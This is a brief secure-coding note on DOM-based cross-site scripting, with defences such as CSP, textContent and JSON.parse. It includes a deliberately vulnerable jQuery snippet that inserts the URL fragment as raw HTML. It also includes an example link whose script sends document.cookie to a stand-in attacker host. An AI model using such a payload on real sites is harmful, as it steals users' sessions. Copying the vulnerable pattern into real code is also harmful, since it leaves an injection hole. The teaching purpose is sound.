# DOM Based XSS

When application use URI fragments (after the # sign) to control, for example location:
```
www.chinterest.com#1
```

The browser content is controlled  and loaded into the DOM as raw HTML:
```JavaScript
$(document).onload(function() {
	var page = window.location.hash;
	loadPage(page);

	$("#page-no").html(page);
});
```

Attacker can construct malicious URL:
```
www.chinterest.com#<script>window.location"http://haxxed.com?cookie="+document.cookie</script>
```

When a user clicks the above link he/she is redirected and his cookie for chinterest is stored in the hacker’s website.

## Protection
* use a JavaScript framework
* Audit your code carefully
* parse JSON carefully
* Detect unsafe code using development tools
* Don’t use URI fragments
* Content-security policy

### Frameworks
Use Angular, React, Ember;

### Audit
Avoid the following properties and functions:
* innerHTML
* outerHTML
* document.write

Set the text within tags whenever possible:
* innerText
* textContent

### Parse JSON
Do not convert parsed JSON into JavaScript objects. Instead of using `eval(…)`, use `JSON.parse(…)`.

### DevTools
Chrome plug-in that can identify insecure practices in client-side code: [domsnitch]

### Don’t do URI fragments
Write a unit test case to look for `window.location.hash`. You don’t need it.

### Content-Security-Policy
```
Content-Security-Policy: script-src 'self' https://apis.google.com

Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://example.com/csr-reports
```